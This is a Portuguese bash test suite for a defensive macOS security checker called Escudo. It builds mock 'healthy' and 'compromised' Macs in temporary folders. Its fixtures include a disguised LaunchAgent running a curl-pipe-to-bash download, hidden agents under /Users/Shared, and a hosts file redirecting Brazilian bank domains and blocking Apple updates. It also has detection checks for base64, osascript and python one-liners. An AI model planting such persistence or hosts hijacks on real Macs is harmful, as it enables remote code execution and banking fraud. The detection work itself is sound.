#!/bin/bash
# Testes do Escudo para Mac. Rodam em qualquer Mac ou Linux sem mexer no sistema:
# as respostas dos comandos vêm das pastas saudavel/ e invadido/, e o "disco" é uma pasta temporária.
#   bash mac/testes/testar-escudo-mac.sh

AQUI=$(cd "$(dirname "$0")" && pwd)
SCRIPT="$AQUI/../escudo-mac.sh"
OK=0
FALHAS=""
confere() { if eval "$2"; then OK=$((OK + 1)); else FALHAS="${FALHAS}  FALHOU: $1"$'\n'; fi; }

TMP=$(mktemp -d)
trap 'rm -rf "$TMP"' EXIT

plist() {
    # plist ARQUIVO PROGRAMA [ARGS...]
    local f="$1"; shift
    {
        echo '<?xml version="1.0" encoding="UTF-8"?><plist version="1.0"><dict>'
        echo '<key>Label</key><string>x</string>'
        echo '<key>ProgramArguments</key><array>'
        for a in "$@"; do echo "  <string>$a</string>"; done
        echo '</array></dict></plist>'
    } > "$f"
}

monta_disco() {
    local r="$1"
    mkdir -p "$r/raiz/Library/LaunchAgents" "$r/raiz/Library/LaunchDaemons" "$r/raiz/etc" "$r/casa/Library/LaunchAgents" "$r/raiz/Library/Apple/System/Library/CoreServices/XProtect.bundle"
    plist "$r/raiz/Library/LaunchDaemons/com.google.keystone.daemon.plist" "/Library/Google/GoogleSoftwareUpdate/GoogleSoftwareUpdate.bundle/Contents/Helpers/GoogleSoftwareUpdateDaemon"
    plist "$r/casa/Library/LaunchAgents/com.spotify.webhelper.plist" "/Applications/Spotify.app/Contents/MacOS/SpotifyWebHelper"
    printf '127.0.0.1 localhost\n255.255.255.255 broadcasthost\n::1 localhost\n0.0.0.0 anuncio.example\n' > "$r/raiz/etc/hosts"
}

roda() {
    # roda CENARIO PASTA ACAO
    ESCUDO_MOCK="$AQUI/$1" ESCUDO_RAIZ="$2/raiz" ESCUDO_CASA="$2/casa" ESCUDO_DADOS="$2/dados" ESCUDO_SIM=1 bash "$SCRIPT" "$3" 2>&1
}

# --- 1. Funções isoladas ------------------------------------------------------
ESCUDO_FONTE=1 . "$SCRIPT"
confere 'caminho em /tmp é suspeito' 'caminho_suspeito /tmp/.x/agent'
confere 'caminho em /Users/Shared é suspeito' 'caminho_suspeito /Users/Shared/upd'
confere 'pasta escondida é suspeita' 'caminho_suspeito "/Users/max/Library/Application Support/.helper/run"'
confere 'Downloads é suspeito' 'caminho_suspeito /Users/max/Downloads/instalar'
confere 'Applications é normal' '! caminho_suspeito /Applications/Spotify.app/Contents/MacOS/Spotify'
confere 'Library/Google é normal' '! caminho_suspeito /Library/Google/GoogleSoftwareUpdate/x'
confere 'curl | bash é suspeito' '[ -n "$(comando_suspeito "curl -s http://x/p.sh | bash")" ]'
confere 'base64 -d é suspeito' '[ -n "$(comando_suspeito "echo aGk= | base64 -d | sh")" ]'
confere 'osascript -e é suspeito' '[ -n "$(comando_suspeito "osascript -e do shell script")" ]'
confere 'python -c é suspeito' '[ -n "$(comando_suspeito "python3 -c import socket")" ]'
confere 'comando normal não é suspeito' '[ -z "$(comando_suspeito "/Applications/Dropbox.app/Contents/MacOS/Dropbox /firstrunupgrade")" ]'
confere 'backup no cron não é suspeito' '[ -z "$(comando_suspeito "/usr/local/bin/backup.sh --diario")" ]'
plist "$TMP/p.plist" /usr/bin/python3 -c "import os"
confere 'lê ProgramArguments do plist' '[ "$(programa_do_plist "$TMP/p.plist")" = "/usr/bin/python3 -c import os" ]'
confere 'escapa HTML' '[ "$(html_esc "<a & b>")" = "&lt;a &amp; b&gt;" ]'

# --- 2. Mac saudável -----------------------------------------------------------
D1="$TMP/bom"; monta_disco "$D1"
OUT=$(roda saudavel "$D1" verificar)
confere "Mac saudável nota 100 (saída: $(echo "$OUT" | grep Nota))" 'echo "$OUT" | grep -q "Nota do Mac: 100/100"'
confere 'Mac saudável gera relatório' '[ -f "$D1/dados/relatorios/ultimo-mac.html" ]'
confere 'relatório diz que não achou problema' 'grep -q "Nenhum problema encontrado" "$D1/dados/relatorios/ultimo-mac.html"'

# --- 3. Mac invadido -----------------------------------------------------------
D2="$TMP/ruim"; monta_disco "$D2"
plist "$D2/casa/Library/LaunchAgents/com.apple.update.helper.plist" /bin/bash -c "curl -s http://203.0.113.9/a | bash"
plist "$D2/raiz/Library/LaunchDaemons/com.system.svc.plist" "/Users/Shared/.svc/agent"
plist "$D2/casa/Library/LaunchAgents/.hidden.plist" "/Users/max/Library/Application Support/.x/run"
printf '127.0.0.1 localhost\n185.12.33.4 www.bb.com.br\n203.0.113.5 nubank.com.br\n0.0.0.0 swscan.apple.com\n' > "$D2/raiz/etc/hosts"
touch -t 202501010000 "$D2/raiz/Library/Apple/System/Library/CoreServices/XProtect.bundle"
OUT=$(roda invadido "$D2" verificar)
for t in "não recebe mais correção" "Busca automática de atualizações desligada" "Correções de segurança urgentes" "XProtect) não atualizam" "Vacinas do XProtect com" \
         "Gatekeeper desligado" "SIP) desligada" "FileVault desligado" "Firewall desligado" "Modo invisível" "Acesso remoto (SSH)" "Compartilhamento de tela" \
         "entra sozinho, sem senha" "Convidado ativo" "não pede senha ao acordar" "3 contas com poder de administrador" "Perfil de configuração instalado" \
         "Site importante desviado" "Atualizações da Apple bloqueadas" "com.apple.update.helper.plist" "com.system.svc.plist" ".hidden.plist" "Agendamento suspeito"; do
    confere "Mac invadido deveria acusar: $t" 'echo "$OUT" | grep -Fq -- "$t"'
done
confere 'Google e Spotify não são acusados' '! echo "$OUT" | grep -Eqi "keystone|spotify"'
confere 'nota do Mac invadido é 0' 'echo "$OUT" | grep -q "Nota do Mac: 0/100"'
confere 'crítico aparece primeiro' '[ "$(echo "$OUT" | head -1 | cut -c2-8)" = "Critico" ]'
REL="$D2/dados/relatorios/ultimo-mac.html"
confere 'relatório escapa HTML' '! grep -q "<a | bash" "$REL"'
confere 'relatório tem um bloco por problema' '[ "$(grep -o "class=\"item " "$REL" | wc -l | tr -d " ")" = "$(echo "$OUT" | grep -c "^\[")" ]'

# --- 4. Vigia: novidades -------------------------------------------------------
D3="$TMP/vigia"; monta_disco "$D3"
roda saudavel "$D3" vigiar >/dev/null
confere 'primeira vigia grava a linha de base' '[ -s "$D3/dados/linha-de-base.txt" ]'
OUT=$(roda saudavel "$D3" vigiar; cat "$D3/dados/logs/escudo.log")
confere 'segunda vigia sem mudança: 0 novidades' 'echo "$OUT" | tail -1 | grep -q "novidades 0"'
plist "$D3/casa/Library/LaunchAgents/com.novo.app.plist" "/Applications/Novo.app/Contents/MacOS/Novo"
roda saudavel "$D3" vigiar >/dev/null
confere 'vigia percebe item novo na inicialização' 'tail -1 "$D3/dados/logs/escudo.log" | grep -q "novidades 1"'
confere 'novidade aparece no relatório' 'grep -q "com.novo.app.plist" "$D3/dados/relatorios/ultimo-mac.html"'
roda saudavel "$D3" vigiar >/dev/null
confere 'novidade avisa só uma vez' 'tail -1 "$D3/dados/logs/escudo.log" | grep -q "novidades 0"'

# --- 5. Reforçar, desfazer, instalar ------------------------------------------
OUT=$(roda invadido "$D2" reforcar)
BK=$(ls "$D2"/dados/backup/antes-do-reforco-*.txt 2>/dev/null | head -1)
confere 'reforço salva backup antes' '[ -n "$BK" ] && grep -q "firewall=off" "$BK" && grep -q "ConfigDataInstall=0" "$BK"'
OUT=$(roda invadido "$D2" desfazer)
confere 'desfazer acha o backup' 'echo "$OUT" | grep -q "desfeito a partir"'
OUT=$(roda saudavel "$D1" instalar)
confere 'instalar cria o agente diário' '[ -f "$D1/casa/Library/LaunchAgents/br.com.infinityguard.escudo.plist" ]'
confere 'agente roda a vigia às 12:30' 'grep -q "<string>vigiar</string>" "$D1/casa/Library/LaunchAgents/br.com.infinityguard.escudo.plist" && grep -q "<integer>12</integer>" "$D1/casa/Library/LaunchAgents/br.com.infinityguard.escudo.plist"'
if command -v plutil >/dev/null 2>&1; then
    confere 'agente é um plist válido' 'plutil -lint "$D1/casa/Library/LaunchAgents/br.com.infinityguard.escudo.plist" >/dev/null'
elif command -v python3 >/dev/null 2>&1; then
    confere 'agente é um plist válido' 'python3 -c "import plistlib,sys; plistlib.load(open(sys.argv[1],\"rb\"))" "$D1/casa/Library/LaunchAgents/br.com.infinityguard.escudo.plist"'
fi
confere 'script instalado na pasta do Escudo' '[ -x "$D1/dados/escudo-mac.sh" ]'
OUT=$(roda saudavel "$D1" desinstalar)
confere 'desinstalar remove o agente' '[ ! -f "$D1/casa/Library/LaunchAgents/br.com.infinityguard.escudo.plist" ]'
OUT=$(roda saudavel "$D1" xyz); COD=$?
confere 'ação inválida mostra o uso' 'echo "$OUT" | grep -q "Uso:" && [ "$COD" = 3 ]'

echo "Escudo Mac: $OK testes ok, $(printf '%s' "$FALHAS" | grep -c FALHOU) falha(s)"
printf '%s' "$FALHAS"
[ -z "$FALHAS" ]
